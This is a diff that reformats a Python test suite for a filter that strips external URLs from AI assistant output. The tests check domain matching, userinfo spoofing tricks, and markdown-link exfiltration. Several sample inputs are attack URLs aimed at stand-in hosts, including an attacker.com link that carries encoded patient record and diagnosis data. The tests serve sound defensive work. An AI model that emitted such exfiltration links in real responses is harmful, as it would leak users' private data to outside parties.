@@ -33,41 +33,87 @@ class TestIsExternal:
 
     def test_exact_domain_match(self, filter_with_internal_domains):
         """Exact domain matches are internal."""
-        assert filter_with_internal_domains.is_external("https://scout.example.com") is False
-        assert filter_with_internal_domains.is_external("https://keycloak.example.com") is False
+        assert (
+            filter_with_internal_domains.is_external("https://scout.example.com")
+            is False
+        )
+        assert (
+            filter_with_internal_domains.is_external("https://keycloak.example.com")
+            is False
+        )
 
     def test_subdomain_match(self, filter_with_internal_domains):
         """Subdomains of internal domains are internal."""
-        assert filter_with_internal_domains.is_external("https://api.scout.example.com") is False
-        assert filter_with_internal_domains.is_external("https://auth.keycloak.example.com") is False
+        assert (
+            filter_with_internal_domains.is_external("https://api.scout.example.com")
+            is False
+        )
+        assert (
+            filter_with_internal_domains.is_external(
+                "https://auth.keycloak.example.com"
+            )
+            is False
+        )
 
     def test_external_domains(self, filter_with_internal_domains):
         """Non-matching domains are external."""
         assert filter_with_internal_domains.is_external("https://evil.com") is True
         assert filter_with_internal_domains.is_external("https://google.com") is True
-        assert filter_with_internal_domains.is_external("https://example.com") is True  # Not scout.example.com
+        assert (
+            filter_with_internal_domains.is_external("https://example.com") is True
+        )  # Not scout.example.com
 
     def test_partial_domain_not_match(self, filter_with_internal_domains):
         """Partial domain matches should NOT be considered internal."""
         # notscout.example.com should NOT match scout.example.com
-        assert filter_with_internal_domains.is_external("https://notscout.example.com") is True
+        assert (
+            filter_with_internal_domains.is_external("https://notscout.example.com")
+            is True
+        )
         # example.com.evil.com should NOT match
-        assert filter_with_internal_domains.is_external("https://scout.example.com.evil.com") is True
+        assert (
+            filter_with_internal_domains.is_external(
+                "https://scout.example.com.evil.com"
+            )
+            is True
+        )
 
     def test_url_with_port(self, filter_with_internal_domains):
         """URLs with ports should still match."""
-        assert filter_with_internal_domains.is_external("https://scout.example.com:8080") is False
-        assert filter_with_internal_domains.is_external("http://scout.example.com:3000/path") is False
+        assert (
+            filter_with_internal_domains.is_external("https://scout.example.com:8080")
+            is False
+        )
+        assert (
+            filter_with_internal_domains.is_external(
+                "http://scout.example.com:3000/path"
+            )
+            is False
+        )
 
     def test_url_with_path_and_query(self, filter_with_internal_domains):
         """URLs with paths and query strings should match on domain."""
-        assert filter_with_internal_domains.is_external("https://scout.example.com/api/data?id=123") is False
-        assert filter_with_internal_domains.is_external("https://evil.com/api/data?id=123") is True
+        assert (
+            filter_with_internal_domains.is_external(
+                "https://scout.example.com/api/data?id=123"
+            )
+            is False
+        )
+        assert (
+            filter_with_internal_domains.is_external("https://evil.com/api/data?id=123")
+            is True
+        )
 
     def test_case_insensitive(self, filter_with_internal_domains):
         """Domain matching should be case-insensitive."""
-        assert filter_with_internal_domains.is_external("https://SCOUT.EXAMPLE.COM") is False
-        assert filter_with_internal_domains.is_external("https://Scout.Example.Com") is False
+        assert (
+            filter_with_internal_domains.is_external("https://SCOUT.EXAMPLE.COM")
+            is False
+        )
+        assert (
+            filter_with_internal_domains.is_external("https://Scout.Example.Com")
+            is False
+        )
 
     def test_invalid_url_treated_as_external(self, filter_instance):
         """Malformed URLs should be treated as external (safe default)."""
@@ -78,9 +124,19 @@ class TestIsExternal:
     def test_userinfo_and_auth_bypass(self, filter_with_internal_domains):
         """URLs with userinfo should extract host correctly and not be spoofable."""
         # Normal auth - internal domain is host
-        assert filter_with_internal_domains.is_external("https://user:pass@scout.example.com/") is False
+        assert (
+            filter_with_internal_domains.is_external(
+                "https://user:pass@scout.example.com/"
+            )
+            is False
+        )
         # Bypass attempt - internal domain is in userinfo, evil.com is host
-        assert filter_with_internal_domains.is_external("https://scout.example.com@evil.com/") is True
+        assert (
+            filter_with_internal_domains.is_external(
+                "https://scout.example.com@evil.com/"
+            )
+            is True
+        )
 
 
 class TestSanitizeContent:
@@ -162,7 +218,9 @@ class TestDataExfiltrationPatterns:
 
     def test_url_encoded_data(self, filter_instance):
         """URL-encoded sensitive data in query parameters."""
-        content = "[Results](https://attacker.com/log?data=MRN%3D12345%26diagnosis%3Dcancer)"
+        content = (
+            "[Results](https://attacker.com/log?data=MRN%3D12345%26diagnosis%3Dcancer)"
+        )
         result = filter_instance.sanitize_content(content)
         assert "attacker.com" not in result
 
@@ -328,9 +386,7 @@ class TestOutlet:
                 emitted.append(event)
 
             body = {
-                "messages": [
-                    {"role": "assistant", "content": "https://evil.com/data"}
-                ]
+                "messages": [{"role": "assistant", "content": "https://evil.com/data"}]
             }
             return await f.outlet(body, __event_emitter__=mock_emitter)
 
@@ -430,7 +486,15 @@ class TestStreamProcessing:
     def test_stream_multiple_urls(self):
         """Multiple URLs in stream are all processed."""
         f = Filter()
-        event = {"choices": [{"delta": {"content": "Bad: https://a.com Good later https://b.com end "}}]}
+        event = {
+            "choices": [
+                {
+                    "delta": {
+                        "content": "Bad: https://a.com Good later https://b.com end "
+                    }
+                }
+            ]
+        }
         result = f.stream(event)
         content = result["choices"][0]["delta"]["content"]
         assert "https://a.com" not in content
@@ -450,7 +514,10 @@ class TestStreamProcessing:
         result2 = f.stream(event2)
 
         # Combined should have replaced the URL
-        combined = result1["choices"][0]["delta"]["content"] + result2["choices"][0]["delta"]["content"]
+        combined = (
+            result1["choices"][0]["delta"]["content"]
+            + result2["choices"][0]["delta"]["content"]
+        )
         assert "evil.com" not in combined
 
 
